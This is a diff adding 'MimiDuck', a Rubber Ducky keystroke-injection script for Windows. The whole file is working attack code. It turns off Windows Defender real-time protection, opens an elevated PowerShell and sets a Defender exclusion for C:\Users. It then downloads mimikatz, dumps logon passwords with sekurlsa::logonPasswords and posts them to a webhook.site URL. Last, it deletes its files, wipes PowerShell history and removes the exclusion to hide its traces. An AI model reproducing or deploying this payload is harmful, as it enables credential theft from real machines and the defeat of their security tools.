@@ -1,0 +1,122 @@
+REM    __  __ _           _ _____             _    
+REM   |  \/  (_)         (_)  __ \           | |   
+REM   | \  / |_ _ __ ___  _| |  | |_   _  ___| | __
+REM   | |\/| | | '_ ` _ \| | |  | | | | |/ __| |/ /
+REM   | |  | | | | | | | | | |__| | |_| | (__|   < 
+REM   |_|  |_|_|_| |_| |_|_|_____/ \__,_|\___|_|\_\
+REM                                           
+REM -- MimiDuck
+REM -- OS: Windows
+REM -- Version: 1.1
+REM
+REM -- Payload to disable windows defender protection and dump windows passwords with mimikatz.
+REM
+
+
+DELAY 1500
+
+REM --------------- Disable Windows Defender Realtime Protection
+GUI r
+DELAY 350
+STRING WindowsDefender://Threat/
+ENTER
+DELAY 2500
+TAB
+DELAY 350
+TAB
+DELAY 350
+TAB
+DELAY 350
+TAB
+DELAY 350
+ENTER
+DELAY 350
+SPACE
+DELAY 1000
+LEFTARROW
+DELAY 350
+ENTER
+DELAY 2500
+TAB
+SPACE
+DELAY 350
+TAB 
+SPACE 
+DELAY 350
+TAB 
+DELAY 350
+TAB
+SPACE
+DELAY 350
+ALT F4
+DELAY 2000
+ALT F4
+DELAY 2000
+ALT F4
+REPEAT 10
+
+REM --------------- Open powershell as administrator and set an exclusion path in the C:\Users path.
+GUI r
+DELAY 350
+STRING PowerShell Start PowerShell -Verb RunAs
+ENTER
+DELAY 2500
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 500
+STRING Import-Module Defender
+ENTER
+DELAY 350
+STRING Set-MpPreference -ExclusionPath C:\Users
+ENTER
+DELAY 350
+
+REM --------------- Download Mimikatz
+STRING Invoke-WebRequest -Uri 'https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe' -OutFile "$env:TEMP\7nTGdDFs3.exe"
+ENTER
+DELAY 5000
+
+REM --------------- Go into CMD and dumps the passwords and exports them to a file
+STRING cmd
+ENTER
+DELAY 500
+STRING %TEMP%\7nTGdDFs3.exe > %TEMP%\mimi_output.txt & type %TEMP%\mimi_output.txt;
+ENTER
+DELAY 350
+STRING privilege::debug
+ENTER
+DELAY 500
+STRING sekurlsa::logonPasswords full
+ENTER
+DELAY 800
+STRING exit
+ENTER
+DELAY 350
+STRING exit
+ENTER
+DELAY 500
+
+REM --------------- Sends the mimikatz output to your webhook (CHANGE TO YOUR WEBHOOK)
+STRING Invoke-RestMethod -Uri "https://webhook.site/ID" -Method Post -Body (Get-Content -Raw -Path "$env:TEMP\mimi_output.txt") -ContentType "text/plain"
+ENTER
+DELAY 1500
+
+REM --------------- Cleaning up the traces (Deletes powershell history, created files and removes exclusion)
+STRING del "$env:TEMP\7nTGdDFs3.exe"
+ENTER
+DELAY 350
+STRING del "$env:TEMP\\mimi_output.txt"
+ENTER
+DELAY 350
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+ENTER
+DELAY 350
+STRING Remove-MpPreference -ExclusionPath C:\Users
+ENTER
+DELAY 350
+STRING exit
+ENTER
+ALT F4
+DELAY 350
+ALT F4
